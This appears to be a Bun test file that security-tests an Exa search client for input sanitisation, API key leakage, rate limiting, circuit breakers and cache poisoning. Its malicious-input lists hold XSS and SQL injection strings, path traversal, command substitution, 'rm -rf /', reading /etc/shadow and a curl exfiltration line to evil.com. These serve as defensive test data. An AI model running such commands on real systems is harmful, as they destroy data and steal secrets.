import { describe, it, expect, beforeAll, afterAll, beforeEach } from 'bun:test';
import { spawn } from 'child_process';
import { join } from 'path';
import { promises as fs } from 'fs';

// Import the modules we're testing
import { TestExaClient } from '../utils/test-client';
import { httpClient, RateLimiter, CircuitBreaker, HttpClient } from '../../src/util/http';
import { HttpCache } from '../../src/util/http-cache';

describe('Security Tests', () => {
  describe('Input Validation and Sanitization', () => {
    it('should handle malicious input in search queries', async () => {
      const maliciousInputs = [
        '<script>alert("xss")</script>',
        '"; DROP TABLE users; --',
        '../../etc/passwd',
        '\x00\x01\x02\x03',
        'javascript:alert(1)',
        'data:text/html,<script>alert(1)</script>',
        '{{7*7}}', // Template injection
        '${7*7}', // Expression injection
        '<img src=x onerror=alert(1)>',
        'SELECT * FROM users',
        '`whoami`',
        '$(whoami)',
        '; cat /etc/shadow',
        'rm -rf /',
        'curl http://evil.com/steal?data=',
      ];

      // Test TestExaClient with malicious inputs
      const client = new TestExaClient('test-key');

      for (const maliciousInput of maliciousInputs) {
        try {
          // The client should sanitize or reject malicious input
          const result = await client.executeTask({
            query: maliciousInput,
            type: 'search'
          });

          // If it succeeds, ensure the output doesn't contain the malicious input
          expect(result.data).toBeDefined();
          expect(JSON.stringify(result.data)).not.toContain('<script>');
          expect(JSON.stringify(result.data)).not.toContain('javascript:');
          expect(JSON.stringify(result.data)).not.toContain('data:text/html');
        } catch (error) {
          // It's acceptable for the client to reject malicious input
          expect(error).toBeInstanceOf(Error);
        }
      }
    });

    it('should handle extremely long inputs', async () => {
      const longString = 'a'.repeat(1000000); // 1MB string
      const client = new TestExaClient('test-key');

      try {
        const result = await client.executeTask({
          query: longString,
          type: 'search'
        });

        // Should handle gracefully or reject appropriately
        expect(result).toBeDefined();
      } catch (error) {
        expect(error).toBeInstanceOf(Error);
        // Should not crash due to memory issues
      }
    });

    it('should handle Unicode and special characters safely', async () => {
      const unicodeInputs = [
        '🚀💨🔥', // Emojis
        '\u0000\u0001\u0002', // Control characters
        '\u202E\u202D', // Right-to-left override characters
        '\uFEFF', // BOM character
        '正常中文查询', // Chinese characters
        'بحث عربي', // Arabic text
        'поиск русский', // Cyrillic text
        '👻\x00👽', // Mixed emoji and null bytes
      ];

      const client = new TestExaClient('test-key');

      for (const unicodeInput of unicodeInputs) {
        try {
          const result = await client.executeTask({
            query: unicodeInput,
            type: 'search'
          });

          expect(result).toBeDefined();
          // Should handle Unicode without crashing
        } catch (error) {
          expect(error).toBeInstanceOf(Error);
        }
      }
    });
  });

  describe('API Key Security', () => {
    it('should not expose API keys in error messages', async () => {
      const client = new TestExaClient('super-secret-api-key-12345');

      try {
        const result = await client.executeTask({
          query: 'test',
          type: 'search'
        });
      } catch (error) {
        const errorMessage = error instanceof Error ? error.message : String(error);
        // API key should not appear in error messages
        expect(errorMessage).not.toContain('super-secret-api-key-12345');
        expect(errorMessage).not.toContain('api-key');
        expect(errorMessage).not.toContain('Bearer');
      }
    });

    it('should handle invalid API keys gracefully', async () => {
      const invalidKeys = [
        '', // Empty
        'no', // Too short
        'invalid-key-format', // Invalid format
        '00000000-0000-0000-0000-000000000000', // UUID format but invalid
        'sk-'.repeat(1000), // Too long
        '\x00\x01\x02', // Binary data
        ' ', // Whitespace only
      ];

      for (const invalidKey of invalidKeys) {
        const client = new TestExaClient(invalidKey);

        try {
          const result = await client.executeTask({
            query: 'test',
            type: 'search'
          });
        } catch (error) {
          expect(error).toBeInstanceOf(Error);
          // Should not crash or expose sensitive information
        }
      }
    });

    it('should not log sensitive information', async () => {
      // This test verifies that sensitive data is not logged
      const originalConsoleLog = console.log;
      const originalConsoleError = console.error;
      let loggedData: string[] = [];

      try {
        console.log = (...args: any[]) => {
          loggedData.push(args.join(' '));
        };
        console.error = (...args: any[]) => {
          loggedData.push(args.join(' '));
        };

        const client = new TestExaClient('sensitive-api-key-12345');

        try {
          await client.executeTask({
            query: 'test with sensitive data',
            type: 'search'
          });
        } catch (error) {
          // Expected to fail with invalid key
        }

        const logContent = loggedData.join('\n');

        // Check that sensitive information is not logged
        expect(logContent).not.toContain('sensitive-api-key-12345');
        expect(logContent).not.toContain('Authorization');
        expect(logContent).not.toContain('Bearer');

      } finally {
        console.log = originalConsoleLog;
        console.error = originalConsoleError;
      }
    });
  });

  describe('Rate Limiting and DoS Protection', () => {
    it('should handle rapid requests gracefully', async () => {
      const rateLimiter = new RateLimiter(10, 1000); // 10 requests per second

      // Try to make 20 requests rapidly
      const promises = Array.from({ length: 20 }, () => rateLimiter.acquire());

      const startTime = Date.now();
      await Promise.allSettled(promises);
      const duration = Date.now() - startTime;

      // Should take at least 1 second due to rate limiting
      expect(duration).toBeGreaterThan(1000);

      const stats = rateLimiter.getStats();
      expect(stats.currentRequests).toBeLessThanOrEqual(stats.maxRequests);
    });

    it('should prevent resource exhaustion', async () => {
      const client = new TestExaClient('test-key');

      // Create many concurrent requests
      const promises = Array.from({ length: 100 }, (_, i) =>
        client.executeTask({
          query: `test query ${i}`,
          type: 'search'
        }).catch(error => ({ error: error.message, index: i }))
      );

      const results = await Promise.allSettled(promises);

      // Most should fail gracefully without crashing the system
      const failures = results.filter(r => r.status === 'rejected').length;
      const successes = results.filter(r => r.status === 'fulfilled').length;

      expect(failures + successes).toBe(100); // All requests should complete (success or fail)
    });

    it('should handle memory pressure gracefully', async () => {
      // Test behavior under memory pressure
      const largeData = Array.from({ length: 10000 }, () => ({
        data: 'x'.repeat(1000),
        id: Math.random(),
        timestamp: Date.now()
      }));

      const client = new TestExaClient('test-key');

      try {
        const result = await client.executeTask({
          query: 'test',
          type: 'search',
          largeData
        });

        expect(result).toBeDefined();
      } catch (error) {
        expect(error).toBeInstanceOf(Error);
        // Should handle memory pressure gracefully
      }

      // Clean up large data
      largeData.length = 0;
    });
  });

  describe('Circuit Breaker Security', () => {
    it('should handle cascading failures', async () => {
      const circuitBreaker = new CircuitBreaker({
        failureThreshold: 3,
        resetTimeout: 1000,
        monitoringPeriod: 5000
      });

      let callCount = 0;
      const failingFunction = async () => {
        callCount++;
        if (callCount <= 5) {
          throw new Error(`Simulated failure ${callCount}`);
        }
        return 'success';
      };

      // First few calls should fail
      for (let i = 0; i < 3; i++) {
        try {
          await circuitBreaker.execute(failingFunction);
        } catch (error) {
          expect(error).toBeInstanceOf(Error);
        }
      }

      // Circuit should now be open
      expect(circuitBreaker.getState()).toBe('open');

      // Should fail fast when circuit is open
      try {
        await circuitBreaker.execute(failingFunction);
        expect.fail('Should have failed due to open circuit');
      } catch (error) {
        expect(error.message).toContain('Circuit breaker is OPEN');
      }

      // Wait for reset timeout
      await new Promise(resolve => setTimeout(resolve, 6100));

      // Should be half-open or open (depending on timing)
      const state = circuitBreaker.getState();
      expect(['half_open', 'open']).toContain(state);
    });

    it('should prevent excessive retries during outages', async () => {
      const httpClient = new HttpClient({
        failureThreshold: 2,
        resetTimeout: 5000,
        monitoringPeriod: 10000
      });

      const startTime = Date.now();

      // Make multiple requests that will fail
      const promises = Array.from({ length: 10 }, () =>
        httpClient.get('https://httpbin.org/status/500').catch(error => ({
          error: error.message,
          timestamp: Date.now() - startTime
        }))
      );

      const results = await Promise.allSettled(promises);
      const errors = results.filter(r =>
        r.status === 'fulfilled' && r.value.error
      );

      // Should have circuit breaker errors to prevent excessive retries
      const circuitBreakerErrors = errors.filter(e =>
        e.status === 'fulfilled' && e.value.error.includes('Circuit breaker is OPEN')
      );

      expect(circuitBreakerErrors.length).toBeGreaterThan(0);
    });
  });

  describe('Data Leakage Prevention', () => {
    it('should not expose internal file paths', async () => {
      const client = new TestExaClient('test-key');

      try {
        const result = await client.executeTask({
          query: '/etc/passwd',
          type: 'search'
        });

        if (result.data) {
          const resultString = JSON.stringify(result.data);
          expect(resultString).not.toContain('/etc/');
          expect(resultString).not.toContain('root:x:0:0');
          expect(resultString).not.toContain('/home/');
        }
      } catch (error) {
        expect(error).toBeInstanceOf(Error);
      }
    });

    it('should sanitize error messages to prevent information disclosure', async () => {
      const client = new TestExaClient('invalid-key');

      try {
        await client.executeTask({
          query: 'test',
          type: 'search'
        });
      } catch (error) {
        const errorMessage = error instanceof Error ? error.message : String(error);

        // Should not contain system information
        expect(errorMessage).not.toContain('/home/');
        expect(errorMessage).not.toContain(process.cwd());
        expect(errorMessage).not.toContain(process.env.USER);
        expect(errorMessage).not.toContain(process.env.HOME);
      }
    });

    it('should handle cache poisoning attempts', async () => {
      const cache = new HttpCache({
        enabled: true,
        maxSize: 100,
        defaultTtl: 60000
      });

      const maliciousUrls = [
        '../../../etc/passwd',
        'javascript:alert(1)',
        'data:text/html,<script>alert(1)</script>',
        '<script>alert("xss")</script>',
        'SELECT * FROM users',
        '../../config/database.json',
      ];

      for (const maliciousUrl of maliciousUrls) {
        try {
          cache.set(maliciousUrl, { data: 'malicious' }, { method: 'GET' });

          const cached = cache.get(maliciousUrl, { method: 'GET' });
          if (cached) {
            const cacheString = JSON.stringify(cached);
            expect(cacheString).not.toContain('<script>');
            expect(cacheString).not.toContain('javascript:');
          }
        } catch (error) {
          // Cache should reject malicious URLs
          expect(error).toBeInstanceOf(Error);
        }
      }
    });
  });

  describe('HTTP Security Headers', () => {
    it('should use secure HTTP headers', async () => {
      const client = new HttpClient();

      // This is a unit test for header configuration
      const testHeaders = {
        'User-Agent': 'exa-personal-tool/1.0.0',
        'Content-Type': 'application/json'
      };

      // Verify no sensitive headers are included by default
      expect(testHeaders['Authorization']).toBeUndefined();
      expect(testHeaders['X-API-Key']).toBeUndefined();
      expect(testHeaders['Cookie']).toBeUndefined();
    });
  });
});